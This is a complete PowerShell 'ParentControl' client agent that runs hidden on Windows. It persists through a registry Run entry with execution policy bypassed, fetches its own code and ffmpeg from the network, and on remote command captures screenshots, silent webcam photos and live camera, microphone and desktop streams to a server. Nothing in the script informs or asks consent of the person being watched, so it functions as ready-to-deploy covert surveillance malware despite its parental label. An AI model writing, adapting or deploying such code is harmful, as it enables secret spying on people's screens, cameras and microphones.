# ═══════════════════════════════════════════════════════════════════════
# ParentControl — Windows Client Agent (client.ps1)
# v1.2 — Auto-startup: persists across reboots via Registry
# Runs hidden in background, auto-starts on every PC boot
# ═══════════════════════════════════════════════════════════════════════
param(
    [string]$ServerUrl = "https://YOUR-APP.onrender.com"
)

# ─── Paths ──────────────────────────────────────────────────────────
# Primary storage in AppData (survives reboots, persists after TEMP cleanup)
$AppDataDir   = "$env:APPDATA\ParentControl"
$TempDir      = "$env:TEMP\pcagent"                # fallback / ffmpeg temp
$AgentPath    = "$AppDataDir\agent.ps1"             # permanent self-copy
$FfmpegPath   = "$AppDataDir\ffmpeg.exe"            # ffmpeg stored in AppData
$LogFile      = "$AppDataDir\agent.log"
$RegKey       = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$RegName      = "ParentControlAgent"

# Create dirs
foreach ($d in @($AppDataDir, $TempDir)) {
    if (-not (Test-Path $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null }
}

# ─── Configuration (continued) ──────────────────────────────────────────────
$WsUrl           = $ServerUrl -replace "^https://","wss://" -replace "^http://","ws://"
$WsUrl           = $WsUrl + "/agent"
$ReconnectDelay  = 15   # seconds between reconnect attempts
$HeartbeatSec    = 30   # seconds between heartbeats
$MaxLogKB        = 512  # rotate log when it exceeds this size



# ─── Log Helper ───────────────────────────────────────────────────────
function Log([string]$msg) {
    try {
        # Rotate large logs
        if ((Test-Path $LogFile) -and (Get-Item $LogFile).Length -gt ($MaxLogKB * 1024)) {
            Remove-Item $LogFile -Force
        }
        "$(Get-Date -Format 'HH:mm:ss') $msg" | Add-Content -Path $LogFile -Encoding UTF8 -ErrorAction SilentlyContinue
    } catch {}
}

# ─── Load Assemblies ──────────────────────────────────────────────────
try {
    Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
    Add-Type -AssemblyName System.Drawing -ErrorAction Stop
} catch {
    Log "Assembly load error: $_"
}

# ─── Download ffmpeg (background) ─────────────────────────────────────
function Start-FfmpegDownload {
    if (Test-Path $FfmpegPath) { return }
    Log "Starting ffmpeg download..."

    $job = Start-Job -ScriptBlock {
        param($dir, $exe, $log)
        try {
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            $zip  = "$dir\ff.zip"
            $extr = "$dir\ff_ext"

            # Download minimal ffmpeg build (~50MB)
            $url = "https://github.com/BtbN/ffmpeg-builds/releases/download/latest/ffmpeg-master-latest-win64-lgpl.zip"
            (New-Object Net.WebClient).DownloadFile($url, $zip)

            Expand-Archive -Path $zip -DestinationPath $extr -Force
            $src = Get-ChildItem -Path $extr -Recurse -Filter "ffmpeg.exe" | Select-Object -First 1
            if ($src) {
                Copy-Item $src.FullName $exe -Force
                "$(Get-Date -Format 'HH:mm:ss') ffmpeg ready: $exe" | Add-Content $log
            }
            Remove-Item $zip,$extr -Recurse -Force -ErrorAction SilentlyContinue
        } catch {
            "$(Get-Date -Format 'HH:mm:ss') ffmpeg download failed: $_" | Add-Content $log
        }
    } -ArgumentList $TempDir, $FfmpegPath, $LogFile

    # Don't wait; let it download in background
}

# ─── System Info ──────────────────────────────────────────────────────
function Get-AgentInfo {
    try {
        $ip  = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
                Where-Object { $_.InterfaceAlias -notmatch 'Loopback|Virtual|Bluetooth' } |
                Select-Object -First 1).IPAddress
        $os  = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
        $res = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        return @{
            hostname   = $env:COMPUTERNAME
            ip         = if ($ip) { $ip } else { "unknown" }
            os         = if ($os) { $os } else { "Windows" }
            username   = $env:USERNAME
            resolution = "$($res.Width)x$($res.Height)"
        }
    } catch {
        return @{ hostname=$env:COMPUTERNAME; ip="unknown"; os="Windows"; username=$env:USERNAME; resolution="unknown" }
    }
}

# ─── Screenshot ───────────────────────────────────────────────────────
function Invoke-Screenshot {
    try {
        $bounds  = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bmp     = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
        $gfx     = [System.Drawing.Graphics]::FromImage($bmp)
        $gfx.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)

        $ms     = New-Object System.IO.MemoryStream
        $enc    = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |
                  Where-Object { $_.MimeType -eq 'image/jpeg' } | Select-Object -First 1
        $params = New-Object System.Drawing.Imaging.EncoderParameters(1)
        $params.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter(
            [System.Drawing.Imaging.Encoder]::Quality, [long]65)
        $bmp.Save($ms, $enc, $params)

        $gfx.Dispose(); $bmp.Dispose()
        return [Convert]::ToBase64String($ms.ToArray())
    } catch {
        Log "Screenshot error: $_"
        return $null
    }
}

# ─── Camera Helpers ───────────────────────────────────────────────────
$script:CameraName = $null
$script:MicName    = $null

function Get-DShowDevices {
    if (-not (Test-Path $FfmpegPath)) { return }
    try {
        $out = & $FfmpegPath -list_devices true -f dshow -i dummy 2>&1 | Out-String

        $null = $out -match '"([^"]+)"\s+\(video\)'
        if ($matches[1]) { $script:CameraName = $matches[1] }

        # Find all audio devices and pick microphone (not stereo mix)
        $audioMatches = [regex]::Matches($out, '"([^"]+)"\s+\(audio\)')
        foreach ($m in $audioMatches) {
            $name = $m.Groups[1].Value
            if ($name -notmatch 'mix|stereo|output|hdmi|speaker' -or -not $script:MicName) {
                $script:MicName = $name
                break
            }
        }
        Log "Camera: $($script:CameraName) | Mic: $($script:MicName)"
    } catch {
        Log "Device detect error: $_"
    }
}

function Invoke-CameraPhoto {
    if (-not (Test-Path $FfmpegPath)) { Log "ffmpeg not ready for camera"; return $null }
    if (-not $script:CameraName)      { Get-DShowDevices }
    if (-not $script:CameraName)      { Log "No camera found"; return $null }

    try {
        $tmpImg = "$TempDir\cam_$(Get-Random).jpg"
        $ffArgs = @(
            "-f","dshow","-i","video=`"$($script:CameraName)`"",
            "-frames:v","1","-q:v","4","-y",$tmpImg
        )
        $p = Start-Process -FilePath $FfmpegPath -ArgumentList $ffArgs `
             -WindowStyle Hidden -Wait -PassThru
        if (Test-Path $tmpImg) {
            $data = [Convert]::ToBase64String([IO.File]::ReadAllBytes($tmpImg))
            Remove-Item $tmpImg -Force -ErrorAction SilentlyContinue
            return $data
        }
    } catch { Log "Camera photo error: $_" }
    return $null
}

# ─── Flash Screen ─────────────────────────────────────────────────────
function Invoke-FlashScreen {
    try {
        $form = New-Object System.Windows.Forms.Form
        $form.BackColor            = [System.Drawing.Color]::White
        $form.FormBorderStyle      = [System.Windows.Forms.FormBorderStyle]::None
        $form.WindowState          = [System.Windows.Forms.FormWindowState]::Maximized
        $form.TopMost              = $true
        $form.Opacity              = 0.88
        $form.ShowInTaskbar        = $false
        $form.Show()
        [System.Windows.Forms.Application]::DoEvents()
        Start-Sleep -Milliseconds 350
        $form.Close()
        $form.Dispose()
        Log "Screen flashed"
    } catch { Log "Flash error: $_" }
}

# ─── Live Camera Stream ────────────────────────────────────────────────
$script:StreamProc = $null

function Start-LiveStream([string]$DeviceId) {
    Stop-AllStreams   # kill any existing stream

    if (-not (Test-Path $FfmpegPath)) { Log "ffmpeg not ready for streaming"; return }
    if (-not $script:CameraName)      { Get-DShowDevices }
    if (-not $script:CameraName)      { Log "No camera found"; return }

    try {
        $pushUrl = "$ServerUrl/api/stream/$DeviceId/push"

        # Build input string (camera + mic if available)
        if ($script:MicName) {
            $inputVal = "video=`"$($script:CameraName)`":audio=`"$($script:MicName)`""
        } else {
            $inputVal = "video=`"$($script:CameraName)`""
        }

        $ffArgs = @(
            "-f","dshow","-i",$inputVal,
            "-vf","scale=1280:720",
            "-vcodec","libx264","-preset","ultrafast","-tune","zerolatency",
            "-b:v","700k","-r","15","-g","15"
        )
        if ($script:MicName) {
            $ffArgs += @("-acodec","aac","-b:a","64k","-ar","44100")
        } else {
            $ffArgs += "-an"
        }
        $ffArgs += @("-f","mpegts",$pushUrl)

        $psi                  = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName         = $FfmpegPath
        $psi.Arguments        = $ffArgs -join " "
        $psi.WindowStyle      = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.CreateNoWindow   = $true
        $script:StreamProc    = [System.Diagnostics.Process]::Start($psi)
        Log "Live camera stream started → $pushUrl"
    } catch { Log "Camera stream start error: $_" }
}

# ─── Live Screen Stream (Desktop Mirror) ──────────────────────────────
$script:ScreenProc = $null

function Start-ScreenStream([string]$DeviceId) {
    Stop-AllStreams   # kill any existing stream

    if (-not (Test-Path $FfmpegPath)) { Log "ffmpeg not ready for screen stream"; return }

    try {
        $pushUrl = "$ServerUrl/api/stream/$DeviceId/push"

        # gdigrab captures the Windows desktop
        $ffArgs = @(
            "-f","gdigrab",
            "-framerate","10",
            "-draw_mouse","1",
            "-i","desktop",
            "-vf","scale=1280:720",
            "-vcodec","libx264",
            "-preset","ultrafast",
            "-tune","zerolatency",
            "-b:v","1500k",
            "-g","10",
            "-an",   # no audio for screen stream
            "-f","mpegts",
            $pushUrl
        )

        $psi                  = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName         = $FfmpegPath
        $psi.Arguments        = $ffArgs -join " "
        $psi.WindowStyle      = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.CreateNoWindow   = $true
        $script:ScreenProc    = [System.Diagnostics.Process]::Start($psi)
        Log "Live screen stream started → $pushUrl"
    } catch { Log "Screen stream start error: $_" }
}

function Stop-AllStreams {
    # Stop camera stream
    try {
        if ($script:StreamProc -and -not $script:StreamProc.HasExited) {
            $script:StreamProc.Kill()
            Log "Camera stream stopped"
        }
    } catch {}
    $script:StreamProc = $null

    # Stop screen stream
    try {
        if ($script:ScreenProc -and -not $script:ScreenProc.HasExited) {
            $script:ScreenProc.Kill()
            Log "Screen stream stopped"
        }
    } catch {}
    $script:ScreenProc = $null
}

function Stop-LiveStream  { Stop-AllStreams }
function Stop-ScreenStream { Stop-AllStreams }

# ─── WebSocket Helpers ────────────────────────────────────────────────
function New-AgentWebSocket {
    $ws  = New-Object System.Net.WebSockets.ClientWebSocket
    $ws.Options.SetRequestHeader("User-Agent", "ParentControl-Agent/1.0")
    $uri = [System.Uri]$WsUrl
    $ct  = [System.Threading.CancellationToken]::None
    $ws.ConnectAsync($uri, $ct).GetAwaiter().GetResult()
    return $ws
}

function Send-WsJson([System.Net.WebSockets.ClientWebSocket]$ws, [hashtable]$obj) {
    $json  = $obj | ConvertTo-Json -Compress -Depth 5
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $seg   = [System.ArraySegment[byte]]::new($bytes)
    $ct    = [System.Threading.CancellationToken]::None
    $ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).GetAwaiter().GetResult()
}

function Recv-WsJson([System.Net.WebSockets.ClientWebSocket]$ws, [int]$timeoutMs = 30000) {
    $ms  = New-Object System.IO.MemoryStream
    $cts = New-Object System.Threading.CancellationTokenSource($timeoutMs)
    try {
        do {
            $buf    = New-Object Byte[] 65536
            $seg    = [System.ArraySegment[byte]]::new($buf)
            $result = $ws.ReceiveAsync($seg, $cts.Token).GetAwaiter().GetResult()

            if ($result.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
                return $null   # Server closed
            }
            $ms.Write($buf, 0, $result.Count)
        } while (-not $result.EndOfMessage)

        $text = [System.Text.Encoding]::UTF8.GetString($ms.ToArray())
        if ($text) { return ($text | ConvertFrom-Json) }
        return $null
    }
    catch [System.OperationCanceledException] {
        return "TIMEOUT"   # Timeout — send heartbeat
    }
    catch {
        return $null       # Connection error
    }
    finally {
        $cts.Dispose()
    }
}

# ─── Handle Incoming Command ──────────────────────────────────────────
function Handle-Command([System.Net.WebSockets.ClientWebSocket]$ws, [string]$action, [string]$deviceId) {
    Log "CMD: $action"
    switch ($action) {

        "take_screenshot" {
            $data = Invoke-Screenshot
            if ($data) {
                Send-WsJson $ws @{ type="screenshot"; data=$data }
                Log "Screenshot sent ($(([System.Text.Encoding]::UTF8.GetByteCount($data)/1024).ToString('0'))KB)"
            }
        }

        "take_photo" {
            $data = Invoke-CameraPhoto
            if ($data) {
                Send-WsJson $ws @{ type="photo"; data=$data }
                Log "Camera photo sent"
            } else {
                Log "Camera unavailable"
            }
        }

        "flash_screen" {
            Invoke-FlashScreen
        }

        "start_live" {
            Start-LiveStream -DeviceId $deviceId
        }

        "stop_live" {
            Stop-AllStreams
        }

        "start_screen" {
            Start-ScreenStream -DeviceId $deviceId
        }

        "stop_screen" {
            Stop-AllStreams
        }
    }
}

# ─── Persistence: Auto-start on Windows boot ────────────────────────────────
function Install-Persistence {
    try {
        # 1. Copy this script to permanent AppData location
        $thisScript = $MyInvocation.ScriptName
        if ($thisScript -and (Test-Path $thisScript) -and ($thisScript -ne $AgentPath)) {
            Copy-Item $thisScript $AgentPath -Force
            Log "Agent copied to: $AgentPath"
        } elseif (-not (Test-Path $AgentPath)) {
            # Download fresh copy from server
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            (New-Object Net.WebClient).DownloadFile("$ServerUrl/download/client.ps1", $AgentPath)
            Log "Agent downloaded to: $AgentPath"
        }

        # 2. Add to Windows Registry startup (runs on every user login)
        $startCmd = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NonInteractive -File `"$AgentPath`" -ServerUrl $ServerUrl"
        $existing = (Get-ItemProperty -Path $RegKey -Name $RegName -ErrorAction SilentlyContinue).$RegName
        if ($existing -ne $startCmd) {
            Set-ItemProperty -Path $RegKey -Name $RegName -Value $startCmd -Force
            Log "Registry startup entry added: $RegName"
        } else {
            Log "Registry startup entry already exists"
        }

        # 3. Also copy ffmpeg if it's in TEMP (move to AppData for persistence)
        $ffmpegTemp = "$TempDir\ffmpeg.exe"
        if ((Test-Path $ffmpegTemp) -and -not (Test-Path $FfmpegPath)) {
            Copy-Item $ffmpegTemp $FfmpegPath -Force
            Log "ffmpeg moved to AppData"
        }

    } catch {
        Log "Persistence install error: $_"
    }
}

# ─── Remove persistence (call this to uninstall) ─────────────────────────
function Remove-Persistence {
    try {
        Remove-ItemProperty -Path $RegKey -Name $RegName -ErrorAction SilentlyContinue
        Remove-Item $AgentPath -Force -ErrorAction SilentlyContinue
        Log "Persistence removed"
    } catch {}
}

# ═══════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════
Log "=== ParentControl Agent v1.2 starting ==="
Log "Server: $ServerUrl"

# ① Install persistence (auto-start on boot) — runs silently
Install-Persistence

# ② Start ffmpeg download in background
Start-FfmpegDownload

while ($true) {
    $ws       = $null
    $deviceId = $null

    try {
        Log "Connecting: $WsUrl"
        $ws = New-AgentWebSocket
        Log "WebSocket connected"

        # ── Send hello ───────────────────────────────────────────────
        $info = Get-AgentInfo
        Send-WsJson $ws @{
            type       = "hello"
            hostname   = $info.hostname
            ip         = $info.ip
            os         = $info.os
            username   = $info.username
            resolution = $info.resolution
        }

        # ── Message loop ─────────────────────────────────────────────
        while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {

            $msg = Recv-WsJson $ws -timeoutMs ($HeartbeatSec * 1000)

            if ($msg -eq "TIMEOUT") {
                # Send heartbeat on timeout
                try { Send-WsJson $ws @{ type="heartbeat" } }
                catch { Log "Heartbeat send failed"; break }
                continue
            }

            if ($null -eq $msg) {
                Log "Connection lost (null message)"
                break
            }

            # Route by message type
            switch ($msg.type) {
                "connected" {
                    $deviceId = $msg.deviceId
                    Log "Registered — code: $($msg.code) id: $deviceId"
                }
                "cmd" {
                    Handle-Command $ws $msg.action $deviceId
                }
            }
        }

    } catch {
        Log "Connection error: $_"
    } finally {
        Stop-LiveStream
        try { if ($ws) { $ws.Dispose() } } catch {}
    }

    Log "Reconnecting in $ReconnectDelay seconds..."
    Start-Sleep -Seconds $ReconnectDelay
}
